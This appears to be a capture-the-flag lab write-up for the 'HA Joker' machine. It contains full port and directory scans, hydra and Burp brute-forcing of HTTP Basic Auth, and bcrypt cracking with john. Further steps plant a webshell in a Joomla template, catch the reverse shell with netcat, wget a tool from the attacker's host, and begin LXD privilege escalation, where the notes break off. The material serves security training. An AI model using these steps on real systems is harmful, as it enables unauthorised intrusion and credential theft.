@@ -1,0 +1,762 @@
+HA Joker CTF
+
+"We have developed this lab for the purpose of online penetration practices. Solving this lab is not that tough if you have proper basic knowledge of Penetration testing. Let’s start and learn how to breach it."
+
+    Enumerate Services
+    - Nmap
+    Bruteforce
+    - Performing Bruteforce on files over http
+    - Performing Bruteforce on Basic Authentication
+    Hash Crack
+    - Performing Bruteforce on hash to crack zip file
+    - Performing Bruteforce on hash to crack mysql user
+    Exploitation
+    - Getting a reverse connection
+    - Spawning a TTY Shell
+    Privilege Escalation
+    - Get root taking advantage of flaws in LXD
+
+
+
+root@ip-10-10-131-144:~# nmap -sC -sV -O -T 4 -p- 10.10.85.227
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-03-03 15:36 GMT
+Nmap scan report for ip-10-10-85-227.eu-west-1.compute.internal (10.10.85.227)
+Host is up (0.00049s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
+|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
+|_  256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (EdDSA)
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: HA: Joker
+8080/tcp open  http    Apache httpd 2.4.29
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=Please enter the password.
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 401 Unauthorized
+MAC Address: 02:79:0C:83:6B:2B (Unknown)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.60%E=4%D=3/3%OT=22%CT=1%CU=43636%PV=Y%DS=1%DC=D%G=Y%M=02790C%TM
+OS:=6220E583%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=108%TI=Z%CI=I%TS=A)S
+OS:EQ(SP=FE%GCD=1%ISR=108%TI=Z%CI=RD%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M2301
+OS:ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)WI
+OS:N(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=69
+OS:03%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T
+OS:3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S
+OS:=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%
+OS:RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 1 hop
+Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1286.55 seconds
+
+root@ip-10-10-131-144:~# nmap --script discovery -T 4 -p- 10.10.85.227
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-03-03 15:59 GMT
+Pre-scan script results:
+| targets-asn: 
+|_  targets-asn.asn is a mandatory parameter
+Nmap scan report for ip-10-10-85-227.eu-west-1.compute.internal (10.10.85.227)
+Host is up (0.00051s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+|_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
+| ssh-hostkey: 
+|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
+|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
+|_  256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (EdDSA)
+| ssh2-enum-algos: 
+|   kex_algorithms: (10)
+|   server_host_key_algorithms: (5)
+|   encryption_algorithms: (6)
+|   mac_algorithms: (10)
+|_  compression_algorithms: (2)
+80/tcp   open  http
+|_http-chrono: Request times for /; avg: 220.28ms; min: 184.24ms; max: 272.51ms
+| http-comments-displayer: 
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=ip-10-10-85-227.eu-west-1.compute.internal
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 1
+|     Comment: 
+|         <!--You can't win anyway... You see, I hold the winning card!-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 57
+|     Comment: 
+|         <!--All I have are negative thoughts.-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 59
+|     Comment: 
+|         <!--I used to think that my life was a tragedy. But now I realize, it\xE2\x80\x99s a comedy.-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 71
+|     Comment: 
+|         <!--Oh I really look like a guy with a plan? You know what I am? I'm a dog chasing cars. I wouldn't know what to do with one if I caught it!-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 19
+|     Comment: 
+|         <!--Quick question: When the clock strikes twelve, do I get a little kiss?-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 13
+|     Comment: 
+|         <!--It's a clear choice me or Pettit. Vote or die. Cancer or tuberculosis.-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 85
+|     Comment: 
+|         <!-- I wouldn't want you to break those perfect porcelain-capped teeth when the juice hits your brain.-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 79
+|     Comment: 
+|         <!--The only sensible way to live in this world is without rules.-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 95
+|     Comment: 
+|         <!--I did it! I finally killed Batman! In front of a bunch of vulnerable, disabled, kids!!!! Now get me Santa Claus!-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 7
+|     Comment: 
+|         <!--I'm not mad at all! I'm just differently sane!!-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 27
+|     Comment: 
+|         <!--If the police expect to play against the Joker, they'd better be prepared to be dealt from the bottom of the deck! -->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 61
+|     Comment: 
+|         <!--Smile, because it confuses people. Smile, because it's easier than explaining what is killing you inside.-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal/css/w3.css
+|     Line number: 148
+|     Comment: 
+|         /* Colors */
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal/css/font.css
+|     Line number: 9
+|     Comment: 
+|         /* latin */
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 35
+|     Comment: 
+|         <!--Devil is double is deuce, my dear doctor ... and joker trumps deuce.-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 9
+|     Comment: 
+|         <!--More powerful than a locomotive, and just about as subtle-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 51
+|     Comment: 
+|         <!--Well, I'd love to stay and celebrate your victory, but I've got stockings to stuff, mistletoe to hang - and about fifteen skyscrapers to blow up before sunrise. Ciao-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 49
+|     Comment: 
+|         <!--Where, oh where has my little Bat gone? Oh where, oh where can he be? His cowl, his scowl, his temper so foul. I do hope he's coming for me.-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 5
+|     Comment: 
+|         <!--Very neat! That ugly head of yours does have a brain!-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 41
+|     Comment: 
+|         <!--Get out of the way, Bats! I've got a date with immortality!-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal/css/font.css
+|     Line number: 1
+|     Comment: 
+|         /* latin-ext */
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal/css/w3.css
+|     Line number: 26
+|     Comment: 
+|         /* End extract */
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 75
+|     Comment: 
+|         <!--Why so serious?-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 39
+|     Comment: 
+|         <!--I've killed your girlfriend, poisoned Gotham, and hell... it's not even breakfast! But so what? We all know you'll save me.-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 25
+|     Comment: 
+|         <!--Every clown loves kids, captain. Just ask Sarah Essen-Gordon. Oh, that's right, you can't!-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal/css/w3.css
+|     Line number: 1
+|     Comment: 
+|         /* W3.CSS 4.13 June 2019 by Jan Egil and Borge Refsnes */
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 93
+|     Comment: 
+|         <!--Ha ha ha ha ha ha ha ha Its a good joke isn't-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 15
+|     Comment: 
+|         <!--If I weren't crazy, I'd be insane!-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 89
+|     Comment: 
+|         <!--Are you sweet talkin' me? All'a that chitchat's gonna getcha hurt-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 91
+|     Comment: 
+|         <!--Twinkle, twinkle, little bat. Watch me kill your favorite cat.-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 45
+|     Comment: 
+|         <!--NOW THIS IS WHAT I CALL A PARTY!!-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 11
+|     Comment: 
+|         <!--One by One, they'll hear my call. Then this wicked town, will follow my fall.-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 3
+|     Comment: 
+|         <!--"I won't even waste the usual Joker Venom on you, Brute, but give you something you can understand...lead!-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 77
+|     Comment: 
+|         <!--They Laugh At me Because I'm Different. I laugh At Then Because The're all the same-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 33
+|     Comment: 
+|         <!--The real joke is your stubborn, bone deep conviction that somehow, somewhere, all of this makes sense! That's what cracks me up each time!-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 69
+|     Comment: 
+|         <!--Introduce a little anarchy. Upset the established order, and everything becomes chaos. I'm an agent of chaos...-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 21
+|     Comment: 
+|         <!--Hello Late-Show lovers...and lovers of the Late-Show!-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 83
+|     Comment: 
+|         <!--I'm not gonna kill ya. I'm just gonna hurt ya... really, really bad. -->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 73
+|     Comment: 
+|         <!--What doesn't kill you, simply makes you stranger!-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 81
+|     Comment: 
+|         <!--Tell your men they work for me now, this is my city!-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 43
+|     Comment: 
+|         <!--Hurry! Batman's just had his way with one of you! Now that's a spicy meat-a-ball!-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal/css/w3.css
+|     Line number: 3
+|     Comment: 
+|         /* Extract from normalize.css by Nicolas Gallagher and Jonathan Neal git.io/normalize */
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 23
+|     Comment: 
+|         <!--Live...and in person! The Caliph of Clowns, the Grand Mogul of Mountebanks, the One and Only JOKER! Prerecorded for this time zone.-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 65
+|     Comment: 
+|         <!--If you\xE2\x80\x99re good at something, never do it for free.-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 63
+|     Comment: 
+|         <!--As you know, madness is like gravity...all it takes is a little push.-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 31
+|     Comment: 
+|         <!--You can't kill me without becoming like me! I can't kill you without losing the only human being who can keep up with me! Isn't it IRONIC?-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 87
+|     Comment: 
+|         <!--Stupid Bats, you're ruining date night! -->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 53
+|     Comment: 
+|         <!--Who's gonna save Gotham now? Robin?!-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 17
+|     Comment: 
+|         <!--You dirty rat! You killed my brother! My sister! My daughter! She's my sister and my daughter!-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 47
+|     Comment: 
+|         <!--Jingle bells, Batman smells, Gotham's quite a mess! Blackgate's mine and you're out of time, which means you'll soon be dead!-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 29
+|     Comment: 
+|         <!--If I weren't insane: I couldn't be so brilliant!-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 67
+|     Comment: 
+|         <!--Nobody panics when things go \xE2\x80\x9Caccording to plan\xE2\x80\x9D. Even if the plan is horrifying!-->
+|     
+|     Path: http://ip-10-10-85-227.eu-west-1.compute.internal:80/
+|     Line number: 37
+|     Comment: 
+|_        <!--You fell for the old fake Joker gag, Batman! You left me to die!-->
+|_http-date: Thu, 03 Mar 2022 16:19:01 GMT; 0s from local time.
+|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
+| http-enum: 
+|   /phpinfo.php: Possible information file
+|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_  /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_http-errors: Couldn't find any error pages.
+|_http-feed: Couldn't find any feeds.
+| http-headers: 
+|   Date: Thu, 03 Mar 2022 16:19:01 GMT
+|   Server: Apache/2.4.29 (Ubuntu)
+|   Last-Modified: Wed, 09 Oct 2019 04:54:22 GMT
+|   ETag: "1742-5947314152e73"
+|   Accept-Ranges: bytes
+|   Content-Length: 5954
+|   Vary: Accept-Encoding
+|   Connection: close
+|   Content-Type: text/html
+|   
+|_  (Request type: HEAD)
+|_http-mobileversion-checker: No mobile version detected.
+|_http-referer-checker: Couldn't find any cross-domain scripts.
+|_http-security-headers: 
+| http-sitemap-generator: 
+|   Directory structure:
+|     /
+|       Other: 1
+|     /css/
+|       css: 2
+|     /img/
+|       jpg: 1; png: 16
+|   Longest directory structure:
+|     Depth: 1
+|     Dir: /img/
+|   Total files found (by extension):
+|_    Other: 1; css: 2; jpg: 1; png: 16
+|_http-title: HA: Joker
+| http-useragent-tester: 
+|   Status for browser useragent: 200
+|   Allowed User Agents: 
+|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+|     libwww
+|     lwp-trivial
+|     libcurl-agent/1.0
+|     PHP/
+|     Python-urllib/2.5
+|     GT::WWW
+|     Snoopy
+|     MFC_Tear_Sample
+|     HTTP::Lite
+|     PHPCrawl
+|     URI::Fetch
+|     Zend_Http_Client
+|     http client
+|     PECL::HTTP
+|     Wget/1.13.4 (linux-gnu)
+|_    WWW-Mechanize/1.34
+| http-vhosts: 
+|_127 names had status 200
+|_http-xssed: No previously reported XSS vuln.
+8080/tcp open  http-proxy
+| http-auth-finder: 
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=ip-10-10-85-227.eu-west-1.compute.internal
+|   url                                                      method
+|_  http://ip-10-10-85-227.eu-west-1.compute.internal:8080/  HTTP: Basic
+|_http-chrono: Request times for /; avg: 221.18ms; min: 183.31ms; max: 274.15ms
+|_http-date: Thu, 03 Mar 2022 16:19:04 GMT; 0s from local time.
+| http-headers: 
+|   Date: Thu, 03 Mar 2022 16:19:09 GMT
+|   Server: Apache/2.4.29 (Ubuntu)
+|   WWW-Authenticate: Basic realm=" Please enter the password."
+|   Content-Length: 491
+|   Connection: close
+|   Content-Type: text/html; charset=iso-8859-1
+|   
+|_  (Request type: GET)
+|_http-title: 401 Unauthorized
+| http-vhosts: 
+|_127 names had status 401
+MAC Address: 02:79:0C:83:6B:2B (Unknown)
+
+Host script results:
+| dns-brute: 
+|   DNS Brute-force hostnames: 
+|_    ns0.eu-west-1.compute.internal - 172.16.0.23
+|_fcrdns: PASS (ip-10-10-85-227.eu-west-1.compute.internal)
+|_ipidseq: All zeros
+|_path-mtu: PMTU == 9001
+| qscan: 
+| PORT  FAMILY  MEAN (us)  STDDEV  LOSS (%)
+| 1     0       0.00       -0.00   100.0%
+| 22    0       517.30     50.12   0.0%
+| 80    1       663.00     -nan    90.0%
+|_8080  0       481.80     60.37   0.0%
+
+Nmap done: 1 IP address (1 host up) scanned in 1183.70 seconds
+
+root@ip-10-10-131-144:~# gobuster dir -u http://10.10.85.227 -w /usr/share/wordlists/dirb/big.txt -x php txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.85.227
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php
+[+] Timeout:        10s
+===============================================================
+2022/03/03 16:03:48 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/.htpasswd (Status: 403)
+/.htpasswd.php (Status: 403)
+/css (Status: 301)
+/img (Status: 301)
+/phpinfo.php (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2022/03/03 16:03:53 Finished
+===============================================================
+
+root@ip-10-10-131-144:~# gobuster dir -u http://10.10.85.227 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.85.227
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     txt
+[+] Timeout:        10s
+===============================================================
+2022/03/03 16:05:30 Starting gobuster
+===============================================================
+/img (Status: 301)
+/css (Status: 301)
+/secret.txt (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2022/03/03 16:06:15 Finished
+===============================================================
+
+root@ip-10-10-131-144:~# nikto -h 10.10.85.227
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.10.85.227
++ Target Hostname:    ip-10-10-85-227.eu-west-1.compute.internal
++ Target Port:        80
++ Start Time:         2022-03-03 16:05:19 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0x1742 0x5947314152e73 
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
++ OSVDB-3233: /phpinfo.php: Contains PHP configuration information
++ OSVDB-3268: /img/: Directory indexing found.
++ OSVDB-3092: /img/: This might be interesting...
++ OSVDB-3233: /icons/README: Apache default file found.
++ 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
++ End Time:           2022-03-03 16:05:29 (GMT0) (10 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+Q1: 2.4.29
+Q2: 80 # as 8080 need authorization and ssh is user + some form of authenication
+Q3: secret.txt # contains:
+Batman hits Joker.
+	Joker: "Bats you may be a rock but you won't break me." (Laughs!)
+	Batman: "I will break you with this rock. You made a mistake now."
+	Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."
+	Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"
+Q4: phpinfo.php
+Q5: joker
+Q6: 8080
+Q7:   # *HINT is to use burp, encode with base64, not hydra
+
+Start Burp -> Project options -> misc -> Tick "Allow the embedded browser to run without a sandbox" # Useless you like FoxyProxy in Firefox
+Navigate to http://$IP:8080 ; forward request
+Attempt to Login ; send the request to Intruder:
+GET / HTTP/1.1
+Host: 10.10.85.227:8080
+Cache-Control: max-age=0
+Authorization: Basic §YXNkOmFzZA==§
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Connection: close
+
+Add the § sysmbols surrounding the basic §base64string§
+Use Sniper as we have (username Joker & password simpleList) -> base64 encoded 
+# Solution script that does:
+# base64(joker:wordlist)
+
+# BUT this will take A LONG TIME
+
+#!/bin/bash
+# Concatenates a given "user:wordlist_elem" -> base64 encodes it and outputs it to a file
+USER:"joker"
+DELIM=":"
+LIST=$(cat /usr/share/wordlists/rockyou.txt)
+for WORD in $LIST;  do
+        echo $USER$DELIM$WORD | base64 >> list.t
+done
+
+# THE HINT IS RATHER NASTY, 
+# Just to improve my scripting I made one for bash, python and almost powershell - still imcomplete and the bash script even with uppder
+
+# Or you could use:
+hydra -l joker -P /usr/share/wordlists/rockyou.txt 10.10.85.227 -s 8080 -f http-get /
+[8080][http-get] host: 10.10.85.227   login: joker   password: hannah
+[STATUS] attack finished for 10.10.85.227 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2022-03-03 18:21:25
+
+Q8: hannah
+
+root@ip-10-10-82-16:~# nikto -h 10.10.85.227:8080 -id joker:hannah
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.10.85.227
++ Target Hostname:    ip-10-10-85-227.eu-west-1.compute.internal
++ Target Port:        8080
++ Start Time:         2022-03-03 19:30:09 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Successfully authenticated to realm ' Please enter the password.' with user-supplied credentials.
++ Cookie 5fef75b50575ebea33a28bd1e7087dcb created without the httponly flag
++ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
++ OSVDB-877: HTTP TRACK method is active, suggesting the host is vulnerable to XST
++ Server leaks inodes via ETags, header found with file /web.config, fields: 0x69a 0x54dfee2e147c0;595bdc8e25952 
++ Uncommon header 'tcn' found, with contents: choice
++ OSVDB-3092: /web.config: ASP config file is accessible.
++ OSVDB-8193: /index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc: EW FileManager for PostNuke allows arbitrary file retrieval.
++ Cookie 0d073d2ec68ac2f24f859831bbe8843b created without the httponly flag
++ Uncommon header 'x-frame-options' found, with contents: SAMEORIGIN
++ OSVDB-3092: /administrator/: This might be interesting...
++ OSVDB-3092: /bin/: This might be interesting...
++ OSVDB-3092: /includes/: This might be interesting...
++ OSVDB-3092: /tmp/: This might be interesting...
++ OSVDB-3092: /README: README file found.
++ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /htaccess.txt: Default Joomla! htaccess.txt file found. This should be removed or renamed.
++ /administrator/index.php: Admin login page/section found.
++ 6544 items checked: 0 error(s) and 20 item(s) reported on remote host
++ End Time:           2022-03-03 19:30:31 (GMT0) (22 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+Q9: /administrator/
+Q10: backup.zip
+# I guessed http://10.10.85.227:8080/backup.zip
+# unzip backup.zip
+
+Q11: hannah
+
+grep -r -e "admin" 
+...INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:15','2019-10-25 15:20:02','0','{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"helpsite\":\"\",\"timezone\":\"\"}','0000-00-00 00:00:00',0,'','',0);
+
+bcrypt
+either 
+hashcat -m 3200 OR john --format=bcrypt 
+root@ip-10-10-82-16:~# john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+abcd1234         (?)
+
+# Log on as admin
+# bottom lefthand corner is Joomla version
+Joomla! 3.7.0 
+# OS version
+MySQLi 5.7.27-0ubuntu0.18.04.1
+
+# Searchsploited, github, but you according to:
+https://github.com/nickapic/TryHackMeWriteUps/blob/master/HA_Joker_CTF_.pdf
+You just replace the index.php with a reverse shell on the template page.
+This works because the index.php is template containing code to make the site dynamic(like login pages) in anyway.
+From the Joomla documentation:
+"The index.php file is the skeleton of the website. Every page that Joomla! delivers is "index.php" fleshed out with a selection of content inserted from the database."
+https://docs.joomla.org/What_is_the_purpose_of_the_index.php_file%3F 
+
+From the to takskbar -> Manage -> Templates -> Templates -> Beez3
+On the left hand side you will see index.php
+
+Remove index.php code, paste in a php webshell
+Save and Close then Template preview; maek sure you have a listener ready
+
+Stablise Shell:
+$ which python3
+/usr/bin/python3
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@ubuntu:/$ export TERM=xterm
+export TERM=xterm
+www-data@ubuntu:/$ ^Z
+[1]+  Stopped                 nc -lvnp 1234
+root@ip-10-10-82-16:~# stty raw -echo; fg
+nc -lvnp 1234
+# press enter a couple of times
+
+www-data@ubuntu:/$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
+
+Q11: www-data
+Q12: lxd
+
+www-data@ubuntu:/$ lxd version
+3.0.3
+
+https://www.hackingarticles.in/lxd-privilege-escalation/
+https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
+
+# I Downloaded the zip of https://github.com/saghul/lxd-alpine-builder
+# And transfered via:
+# python3 -m http.server 4444
+# wget http://$IP:$PORT/lxd-apline-builder.zip
+# Practicing file transfers is important and generally you have more control over the exploitation of the software
+
+# hacktricks, a great resource instructs if we were use our own image:
+# build a simple alpine image
+git clone https://github.com/saghul/lxd-alpine-builder
+cd lxd-alpine-builder
+sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
+sudo ./build-alpine -a i686
+
+# import the image
+lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.
+
+
+# But you can list the images on the machine with:
+
+www-data@ubuntu:/tmp/lxd-alpine-builder-master$ lxc image list
++----------+--------------+--------+------------------------------------+--------+--------+------------------------------+
+|  ALIAS   | FINGERPRINT  | PUBLIC |            DESCRIPTION             |  ARCH  |  SIZE  |         UPLOAD DATE          |
++----------+--------------+--------+------------------------------------+--------+--------+------------------------------+
+| myalpine | a8258f4a885f | no     | Alpine 3.10 amd64 (20191025_13:00) | x86_64 | 2.39MB | Oct 25, 2019 at 8:07pm (UTC) |
++----------+--------------+--------+------------------------------------+--------+--------+------------------------------+
+
+
+# import the image
+lxc image import ./alpine*.tar.gz --alias myimage 
+# Bear in mind that as www-data user home directory is /var/www
+# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+# Hack tricks gives this instruction
+# It's important doing this from YOUR HOME directory on the victim machine, or it might fail.
+# So use /tmp
+# drwxrwxr-x  5 root www-data 4096 Oct 25  2019 www
+
+# before running the image, start and configure the lxd storage pool as default 
+lxd init
